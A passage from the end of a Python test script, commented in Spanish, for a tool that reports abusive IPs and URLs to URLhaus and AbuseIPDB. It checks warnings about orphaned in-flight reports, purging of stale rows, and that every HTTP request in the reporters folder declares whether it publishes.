    _avisos = [m for lv, m in _capt if lv >= _logging.WARNING]
    R.igual("resolve_orphans avisa UNA vez, no una por huerfano", len(_avisos), 1)
    R.check("y el aviso dice cuantos hay en vuelo (%d)" % _n,
            bool(_avisos) and ("%d envio" % _n) in _avisos[0])

    # ---- Y lo que nadie resuelve, no se queda para siempre -----------------
    #
    # Una fila en vuelo BLOQUEA esa clave. Sin este barrido, un corte de red
    # dejaria una IP sin denunciar el resto de la vida de la base.
    estado.db.execute(
        "UPDATE inflight SET started_at='2020-01-01T00:00:00+00:00'"
        " WHERE platform='urlhaus' AND key=?", (uh_no,))
    estado.db.commit()
    estado.purge(dias=30)
    R.check("la purga se lleva los huerfanos muy viejos",
            estado.en_vuelo("urlhaus", uh_no) is None)
    R.check("pero no los recientes",
            estado.en_vuelo("abuseipdb", ab_clave) is not None)

    # ---- Que no se olvide en el siguiente POST que alguien anada -----------
    #
    # Esta es la que de verdad protege: marcar los nueve sitios de hoy no
    # sirve de nada si el decimo se escribe manana sin la bandera. La regla es
    # que TODA peticion declare si publica o si solo lee.
    R.seccion("Toda peticion declara si publica")
    sin_declarar = []
    for fichero in sorted((RAIZ / "reporters").glob("*.py")):
        arbol = ast.parse(fichero.read_text(encoding="utf-8"))
        for nodo in ast.walk(arbol):
            if not isinstance(nodo, ast.Call):
                continue
            f = nodo.func
            if not (isinstance(f, ast.Attribute) and f.attr == "request"
                    and isinstance(f.value, ast.Attribute)
                    and f.value.attr == "http"):
                continue
            banderas = {k.arg for k in nodo.keywords}
            if not banderas & {"crea_recurso", "allow_in_dry_run"}:
                sin_declarar.append("%s:%d" % (fichero.name, nodo.lineno))
    R.igual("ninguna peticion se queda sin declarar", sin_declarar, [])

    estado.close()
    return R.salida()


if __name__ == "__main__":
    sys.exit(main())
